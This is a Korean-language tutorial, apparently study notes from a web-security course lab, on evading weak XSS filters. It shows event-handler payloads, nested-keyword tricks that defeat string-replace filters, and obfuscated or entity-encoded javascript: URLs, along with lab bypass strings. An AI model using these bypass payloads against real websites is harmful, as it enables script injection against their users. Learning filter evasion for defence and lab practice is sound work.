**XSS를 방어하기 위해 필터링을 추가되어있을 때 이를 우회하는 방법**  
# 불충분한 XSS 필터링  

## XSS 필터링의 배경  
HTML은 **SGML을 바탕** -> 기능을 상당 수 유지함으로써 **문법이 복잡**해졌고, 이에 따라 HTML을 해석하는 **소프트웨어의 구조 또한 정교화**  
**브라우저 전쟁** 을 거치면서 별다른 규율 없이 **태그 등을 늘림**  
-> 이러한 과정을 통해 HTML를 해석하는 소프트웨어 작성에 어려움을 겪었고, XSS 필터링도 비활성화 해야하는 경우가 생겼다.  
-> 보안을 위해 XSS 필터링은 **안전하다고 알려진 마크업만 허용**하는 보수적인 방식 (Allowlist 필터링)을 취해야 합니다.  
## 이벤트 핸들러 속성  
자바스크립트 코드를 실행할 수 있는 HTML 태그는 **<script>** 이외에도 상당수 존재  
-> 예 : **onload, onerror, onfocus** 등  
### onload 이벤트 핸들러  
요청하는 데이터를 **로드**한 후에 **실행**, 만약 **로드에 실패**했다면 **실행되지 않습니다.**  
```html
<img src="https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
<!-- → 유효한 이미지 로드 후 onload 핸들러 실행 -->

<img src="about:invalid" onload="alert(document.domain)">
<!-- → 이미지 로드 실패, onload 핸들러 실행하지 않음 -->
```
### onerror 이벤트 핸들러  
요청하는 데이터를 **로드하는데 실패**할 시 **실행**, 만약 **로드에 성공**했다면 **실행되지 않습니다.**  
```html
<img src="valid.jpg" onerror="alert(document.domain)">
<!-- → 유효한 이미지 로드 성공, onerror 핸들러 실행하지 않음 -->

<img src="about:invalid" onerror="alert(document.domain)">
<!-- → 이미지 로드 실패, onerror 핸들러 실행 -->
```
### onfocus 이벤트 핸들러  
**input 태그**에 커서를 클릭하여 **포커스가 되면 실행**되는 이벤트 핸들러  
일반적으로 공격 상황에서 
1. input 태그의 **autofocus 속성**을 이용해 **자동으로 포커스** 시킴
2. **URL의 hash 부분**에 **input 태그의 id 속성 값**을 입력(e.g. http://dreamhack.io/#inputID) 해서 자동으로 포커스 되도록 합니다.  
```html
<input type="text" id="inputID" onfocus="alert(document.domain)" autofocus>
<!-- → autofocus 속성으로 인해 페이지가 로드되지마자 바로 input 태그에 포커스함, 포커스된 직후 onfocus 핸들러 실행 -->
```

## 문자열 치환  
XSS 키워드를 필터링할 때 단순히 **치환 혹은 제거**하는 방식의 필터링 관습이 존재함  
예 : **script** 를 필터링 했을 때, **scrscriptipt** 를 사용하면, 중간의 script가 필터링되고 바깥 쪽의 script가 남는다.  
다음은 필터링 우회 예시이다.  
```
(x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
--> <img onerror=prompt(1) />
```
대응 방안으로 흔히 문자열에 **변화가 없을 때까지 지속적으로 치환**하는 방식이 있다.  
```
function replaceIterate(text) {
    while (true) {
        var newText = text.replace(/script|onerror/gi, '');
        if (newText === text)
            break;
        text = newText;
    }
    return text;
}
replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
--> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
--> <iframe srcdoc="&lt;&gt;parent.alert(1)&lt;/&gt;" />
```

## 문자열 치환 실습  
### Stage 1  
<img src="1.jpg">  

**script** 를 빈 문자열로 치환한다.  
<img src="2.jpg">  

다음과 같이 **<script>alert(1)</script>** 을 적으면 필터링 되는 것을 알 수 있다.  
이 때, 중첩해서 문자열을 적으면 우회할 수 있다.  
<img src="3.jpg">  

**<scrscriptipt>alert(1)</scrscriptipt>** 라고 적으면 성공이다.  

### Stage 2  
<img src="4.jpg">  

**onerror** 를 빈 문자열로 치환한다.  
<img src="5.jpg">  
다음과 같이 **<img src="test.jpg" onerror=alert(1)>** 이렇게 적으면 onerror가 필터링 된다.  
<img src="6.jpg">  
이전 Stage 1과 같이 문자열을 중첩해서 적으면 우회할 수 있다. 
즉, **onerror**를 중첩해서 **<img src="test.jpg" ononerrorerror=alert(1)>** 과 같이 적으면 된다.  

## 활성 하이퍼링크  
HTML 에서 사용될 수 있는 URL들은 활성 콘텐츠를 포함할 수 있습니다.  
이 중 **javascript:** 스키마는 **URL 로드 시 자바스크립트 코드를 실행**할 수 있도록 합니다.  
```html
<a href="javascript:alert(document.domain)">Click me!</a>
<iframe src="javascript:alert(document.domain)">
```
다음과 같이 **a, iframe** 태그에서 javascript를 사용할 수 있다.  
이 경우에 **정규화**를 이용해 필터링을 우회할 수 있다.  
```html
<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
<iframe src="\1\4jAVasC\triPT:alert(document.domain)">
```
또한 태그 속성 내에서 **HTML Entity Encoding** 을 사용할 수 있다.  
즉, **javascript:** 나 다른 키워드로 인코딩해서 우회할 수 있다.  
```html
<a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Click me!</a>
<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
```
자바스크립트에서는 **URL 객체**를 통해 URL을 직접 **정규화할 수 있으며**, **protocol, hostname 등 URL의 각종 정보를 추출**할 수 있습니다.  
```javascript
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)').href
--> "javascript:alert(1)"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').protocol
--> "javascript:"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').pathname
--> "alert(1)"
```

## 태그와 속성 기반 필터링  
## 태그와 속성 기반 필터링 실습  
# 퀴즈  
